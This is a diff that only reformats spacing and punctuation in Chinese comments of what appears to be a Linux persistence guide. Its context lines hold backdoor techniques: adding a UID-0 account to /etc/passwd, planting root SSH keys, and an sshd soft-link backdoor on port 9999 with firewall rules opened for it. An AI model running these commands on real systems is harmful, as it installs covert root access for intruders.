@@ -123,7 +123,7 @@ ssh redi1s@IP
 
 ```plain
 echo "test2:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号
-passwd test2 #修改test2的密码为123456
+passwd test2 #修改 test2 的密码为 123456
 ```
 
 ```plain
@@ -242,36 +242,36 @@ ssh -i id_rsa -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-
 ```plain
 #!/bin/bash
 
-# 添加防火墙规则允许SSH流量
+# 添加防火墙规则允许 SSH 流量
 iptables -A INPUT -p tcp --dport 22 -j ACCEPT || true
 
-# CentOS防火墙规则（永久生效）
+# CentOS 防火墙规则（永久生效）
 firewall-cmd --zone=public --add-port=22/tcp --permanent || true
 firewall-cmd --reload || true
 
-# 启动SSH服务
+# 启动 SSH 服务
 /usr/sbin/sshd || true
 
-# 配置SSH服务器
+# 配置 SSH 服务器
 echo "RSAAuthentication yes" >> /etc/ssh/sshd_config || true
 echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config || true
 echo "AuthorizedKeysFile .ssh/authorized_keys" >> /etc/ssh/sshd_config || true
 
-# 生成SSH密钥对（自动回车）
+# 生成 SSH 密钥对（自动回车）
 yes "" | ssh-keygen -t rsa || true
 ​
-# 创建.ssh目录（如果不存在）
+# 创建.ssh 目录（如果不存在）
 mkdir -p /root/.ssh || true
 
-# 在.ssh目录中创建并编辑authorized_keys文件，添加公钥
+# 在.ssh 目录中创建并编辑 authorized_keys 文件，添加公钥
 touch /root/.ssh/authorized_keys || true
 cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys || true   #这里可以导入本机的密钥
 
-# 打印生成的id_rsa文件内容
+# 打印生成的 id_rsa 文件内容
 echo "生成的 id_rsa 文件内容："
 cat ~/.ssh/id_rsa || true
 
-echo "配置完成."
+echo "配置完成。"
 ```
 
   
@@ -296,7 +296,7 @@ cat /etc/ssh/sshd_config|grep UsePAM
 
 ```plain
 ln -sf /usr/sbin/sshd /tmp/su ;/tmp/su -oPort=9999
-#开启软链接，链接端口为9999
+#开启软链接，链接端口为 9999
 
 firewall-cmd --add-port=9999/tcp --permanent
 #开启防火墙规则，不然会连接不上
@@ -305,7 +305,7 @@ firewall-cmd --reload
 #重启防火墙服务
 
 firewall-cmd --query-port=9999/tcp
-#查看防火墙9999端口是否被放行，回显为YES即成功放行
+#查看防火墙 9999 端口是否被放行，回显为 YES 即成功放行
 
 iptables -A INPUT -p tcp --dport 9999 -j ACCEPT
 
